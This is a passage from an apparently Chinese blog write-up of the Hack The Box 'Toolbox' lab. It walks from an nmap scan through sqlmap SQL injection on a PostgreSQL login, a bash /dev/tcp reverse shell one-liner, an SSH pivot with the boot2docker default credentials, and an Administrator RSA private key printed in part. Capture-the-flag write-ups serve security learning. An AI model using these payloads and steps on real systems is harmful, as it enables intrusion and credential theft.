<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">443</span>/tcp   <span class="token function">open</span>  ssl/http      Apache httpd <span class="token number">2.4</span>.38 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.38 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token operator">|</span> tls-alpn: 
<span class="token operator">|</span>_  http/1.1
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_http-title: MegaLogistics
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>admin.megalogistic.com/organizationName<span class="token operator">=</span>MegaLogistic Ltd/stateOrProvinceName<span class="token operator">=</span>Some-State/countryName<span class="token operator">=</span>GR
<span class="token operator">|</span> Not valid before: <span class="token number">2020</span>-02-18T17:45:56
<span class="token operator">|</span>_Not valid after:  <span class="token number">2021</span>-02-17T17:45:56
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">47001</span>/tcp <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-21T15:20:37
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span>_clock-skew: <span class="token parameter variable">-18m24s</span>
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">180.71</span> seconds
                                                                                         </code></pre>

<p>在443端口发现<code>admin.megalogistic.com</code>，添加本地域名解析</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.236  admin.megalogistic.com'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<p>ftp 允许匿名登录，登录后可以发现 docker-toolbox.exe</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ftp</span> <span class="token number">10.10</span>.10.236 
Connected to <span class="token number">10.10</span>.10.236.
<span class="token number">220</span>-FileZilla Server <span class="token number">0.9</span>.60 beta
<span class="token number">220</span>-written by Tim Kosse <span class="token punctuation">(</span>tim.kosse@filezilla-project.org<span class="token punctuation">)</span>
<span class="token number">220</span> Please visit https://filezilla-project.org/
Name <span class="token punctuation">(</span><span class="token number">10.10</span>.10.236:kali<span class="token punctuation">)</span>: Anonymous
<span class="token number">331</span> Password required <span class="token keyword">for</span> anonymous
Password: 
<span class="token number">230</span> Logged on
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">dir</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">55341</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening data channel <span class="token keyword">for</span> directory listing of <span class="token string">"/"</span>
-r-xr-xr-x <span class="token number">1</span> <span class="token function">ftp</span> <span class="token function">ftp</span>      <span class="token number">242520560</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> docker-toolbox.exe
<span class="token number">226</span> Successfully transferred <span class="token string">"/"</span>
ftp<span class="token operator">></span> get docker-toolbox.exe
local: docker-toolbox.exe remote: docker-toolbox.exe
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">63234</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening data channel <span class="token keyword">for</span> <span class="token function">file</span> download from server of <span class="token string">"/docker-toolbox.exe"</span>
<span class="token number">100</span>% <span class="token operator">|</span>*****************************************************<span class="token operator">|</span>   <span class="token number">231</span> MiB  <span class="token number">617.76</span> KiB/s    00:00 ETA
<span class="token number">226</span> Successfully transferred <span class="token string">"/docker-toolbox.exe"</span>
<span class="token number">242520560</span> bytes received <span class="token keyword">in</span> 06:23 <span class="token punctuation">(</span><span class="token number">617.76</span> KiB/s<span class="token punctuation">)</span>
</code></pre>

<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>访问<code>admin.megalogistic.com</code>，使用burp 抓取登录数据，使用sqlmap测试，存在sql注入</p>
<img src="/Hackthebox/htb/htb-toolbox/image-20250322104959280.png" class="" title="登录">

<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">admin.megalogistic.com</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=21c7525f49e68a4f7653422a03ddecfe</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">35</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua</span><span class="token punctuation">:</span> <span class="token header-value">"Chromium";v="133", "Not(A:Brand";v="99"</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Platform</span><span class="token punctuation">:</span> <span class="token header-value">"Linux"</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://admin.megalogistic.com</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://admin.megalogistic.com/</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Priority</span><span class="token punctuation">:</span> <span class="token header-value">u=0, i</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>

username=admin&amp;password=11111111111</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">$ sqlmap <span class="token parameter variable">-r</span> megalogisic.txt <span class="token parameter variable">--batch</span> --force-ssl
        ___
       __H__
 ___ ___<span class="token punctuation">[</span>,<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.9</span>.2<span class="token comment">#stable&#125;</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span>.<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
|___|_  ['</span><span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:56:30 /2025-03-21/

[23:56:30] [INFO] parsing HTTP request from '</span>megalogisic.txt<span class="token string">'
[23:56:30] [INFO] testing connection to the target URL
&lt;...>
[23:57:59] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '</span>--union-char<span class="token string">'? [Y/n] Y
POST parameter '</span>username<span class="token string">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=admin'</span> AND <span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">1444</span><span class="token operator">=</span><span class="token number">1444</span><span class="token punctuation">)</span> THEN NULL ELSE CAST<span class="token variable"><span class="token punctuation">((</span>CHR<span class="token punctuation">(</span><span class="token number">86</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">))</span></span> AS NUMERIC<span class="token punctuation">)</span> END<span class="token punctuation">))</span> IS NULL AND <span class="token string">'iHTD'</span><span class="token operator">=</span><span class="token string">'iHTD&amp;password=11111111111

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin'</span> AND <span class="token assign-left variable">9042</span><span class="token operator">=</span>CAST<span class="token variable"><span class="token punctuation">((</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">))</span></span><span class="token operator">||</span><span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">9042</span><span class="token operator">=</span><span class="token number">9042</span><span class="token punctuation">)</span> THEN <span class="token number">1</span> ELSE <span class="token number">0</span> END<span class="token punctuation">))</span>::text<span class="token operator">||</span><span class="token punctuation">(</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">107</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">))</span> AS NUMERIC<span class="token punctuation">)</span> AND <span class="token string">'wDZN'</span><span class="token operator">=</span><span class="token string">'wDZN&amp;password=11111111111

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin'</span><span class="token punctuation">;</span>SELECT PG_SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>--<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token number">11111111111</span>

    Type: time-based blind
    Title: PostgreSQL <span class="token operator">></span> <span class="token number">8.1</span> AND time-based blind
    Payload: <span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token string">' AND 2617=(SELECT 2617 FROM PG_SLEEP(5)) AND '</span>AtXQ<span class="token string">'='</span>AtXQ<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token number">11111111111</span>
---
<span class="token punctuation">[</span><span class="token number">23</span>:58:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is PostgreSQL
web server operating system: Linux Debian <span class="token number">10</span> <span class="token punctuation">(</span>buster<span class="token punctuation">)</span>
web application technology: PHP <span class="token number">7.3</span>.14, Apache <span class="token number">2.4</span>.38
back-end DBMS: PostgreSQL
<span class="token punctuation">[</span><span class="token number">23</span>:58:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">23</span>:58:17 /2025-03-21/
</code></pre>

<p>找到admin用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ sqlmap <span class="token parameter variable">-r</span> megalogisic.txt <span class="token parameter variable">--batch</span> --force-ssl <span class="token parameter variable">--dbms</span> PostgreSQL <span class="token parameter variable">--dump</span>
        ___
       __H__
 ___ ___<span class="token punctuation">[</span>,<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.9</span>.2<span class="token comment">#stable&#125;</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">23</span>:59:23 /2025-03-21/

<span class="token punctuation">[</span><span class="token number">23</span>:59:23<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> parsing HTTP request from <span class="token string">'megalogisic.txt'</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
<span class="token punctuation">[</span><span class="token number">23</span>:59:41<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> no <span class="token function">clear</span> password<span class="token punctuation">(</span>s<span class="token punctuation">)</span> found                                                  
Database: public
Table: <span class="token function">users</span>
<span class="token punctuation">[</span><span class="token number">1</span> entry<span class="token punctuation">]</span>
+----------------------------------+----------+
<span class="token operator">|</span> password                         <span class="token operator">|</span> username <span class="token operator">|</span>
+----------------------------------+----------+
<span class="token operator">|</span> 4a100a85cb5ca3616dcf137918550815 <span class="token operator">|</span> admin    <span class="token operator">|</span>
+----------------------------------+----------+

<span class="token punctuation">[</span><span class="token number">23</span>:59:41<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> table <span class="token string">'public.users'</span> dumped to CSV <span class="token function">file</span> <span class="token string">'/home/kali/.local/share/sqlmap/output/admin.megalogistic.com/dump/public/users.csv'</span>
<span class="token punctuation">[</span><span class="token number">23</span>:59:41<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">23</span>:59:41 /2025-03-21/</code></pre>

<p>使用 –os-shell 直接反弹shell <code>bash -c &#39; bash -i &amp;&gt;/dev/tcp/10.10.16.39/9003 &lt;&amp;1&#39;</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ sqlmap <span class="token parameter variable">-r</span> megalogisic.txt  --force-ssl <span class="token parameter variable">--dbms</span> PostgreSQL --os-shell 
        ___
       __H__
 ___ ___<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.9</span>.2<span class="token comment">#stable&#125;</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token string">']     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>
<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span>"<span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:00:38 /2025-03-22/

[00:00:38] [INFO] parsing HTTP request from '</span>megalogisic.txt<span class="token string">'
&lt;...>
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[00:01:47] [INFO] retrieved: '</span>postgres<span class="token string">'
command standard output: '</span>postgres<span class="token string">'
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
[00:02:01] [INFO] retrieved: '</span>uid<span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span>,102<span class="token punctuation">(</span>ssl-<span class="token punctuation">..</span>.
<span class="token builtin class-name">command</span> standard output: <span class="token string">'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'</span>
os-shell<span class="token operator">></span> <span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">' bash -i &amp;>/dev/tcp/10.10.16.39/9003 &lt;&amp;1'</span>
<span class="token keyword">do</span> you want to retrieve the <span class="token builtin class-name">command</span> standard output? <span class="token punctuation">[</span>Y/n/a<span class="token punctuation">]</span> n
</code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>成功接收到shell，查看内核信息，系统是boot2docker</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9003</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9003</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.10.236<span class="token punctuation">]</span> <span class="token number">49945</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">524</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span>,102<span class="token punctuation">(</span>ssl-cert<span class="token punctuation">)</span>
postgres@bc56e3cc55e9:/var/lib/postgresql$ <span class="token function">ifconfig</span> 
<span class="token function">ifconfig</span> 
eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
        inet <span class="token number">172.17</span>.0.2  netmask <span class="token number">255.255</span>.0.0  broadcast <span class="token number">172.17</span>.255.255
        ether 02:42:ac:11:00:02  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">3446</span>  bytes <span class="token number">686371</span> <span class="token punctuation">(</span><span class="token number">670.2</span> KiB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">3502</span>  bytes <span class="token number">1260682</span> <span class="token punctuation">(</span><span class="token number">1.2</span> MiB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ <span class="token function">uname</span> <span class="token parameter variable">-a</span>
<span class="token function">uname</span> <span class="token parameter variable">-a</span>
Linux bc56e3cc55e9 <span class="token number">4.14</span>.154-boot2docker <span class="token comment">#1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux</span>
</code></pre>

<p>通过Google  boot2docker 有默认用户和密码docker：tcuser，使用ssh 切换用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">postgres@bc56e3cc55e9:/$ script /dev/null <span class="token parameter variable">-c</span> /bin/bash
script /dev/null <span class="token parameter variable">-c</span> /bin/bash
Script started, <span class="token function">file</span> is /dev/null
postgres@bc56e3cc55e9:/$ <span class="token function">ssh</span> docker@172.17.0.1
<span class="token function">ssh</span> docker@172.17.0.1
docker@172.17.0.1<span class="token string">'s password: tcuser

   ( '</span><span class="token operator">></span>'<span class="token punctuation">)</span>
  /<span class="token punctuation">)</span> TC <span class="token punctuation">(</span><span class="token punctuation">\</span>   Core is distributed with ABSOLUTELY NO WARRANTY.
 <span class="token punctuation">(</span>/-_--_-<span class="token punctuation">\</span><span class="token punctuation">)</span>           www.tinycorelinux.net

</code></pre>



<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查找可以利用的信息，可以在C:\Users\Administrator.ssh\ 下找到 id_rsa</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker@box:~$ <span class="token builtin class-name">cd</span> /c/Users                                                      
<span class="token builtin class-name">cd</span> /c/Users
docker@box:/c/Users$ <span class="token function">ls</span>                                                        
<span class="token function">ls</span>
Administrator  Default        Public         desktop.ini
All Users      Default User   Tony
docker@box:/c/Users$ <span class="token builtin class-name">cd</span> Administrator                                          
<span class="token builtin class-name">cd</span> Administrator
docker@box:/c/Users/Administrator$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>                                      
<span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">1437</span>
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff         <span class="token number">8192</span> Feb  <span class="token number">8</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
dr-xr-xr-x    <span class="token number">1</span> <span class="token function">docker</span>   staff         <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2020</span> <span class="token punctuation">..</span>
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff         <span class="token number">4096</span> Mar <span class="token number">21</span> <span class="token number">15</span>:15 .VirtualBox
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> .docker
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">19</span>  <span class="token number">2020</span> .ssh
dr-xr-xr-x    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> 3D Objects
drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> AppData
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<p>复制id_rsa 到本地，赋予600 权限，ssh登录可获得管理员权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker@box:/c/Users/Administrator/.ssh$ <span class="token function">cat</span> id_rsa                             
<span class="token function">cat</span> id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----
</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa administrator@10.10.10.236  
The authenticity of <span class="token function">host</span> <span class="token string">'10.10.10.236 (10.10.10.236)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:KJAib23keV2B8xvFaxg7e79uztryW+LYX+Wb2qA9u4k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">10.10</span>.10.236' <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span> to the list of known hosts.

Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">10.0</span>.17763.1039<span class="token punctuation">]</span>
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2018</span> Microsoft Corporation. All rights reserved.

administrator@TOOLBOX C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">></span>
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\flag.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
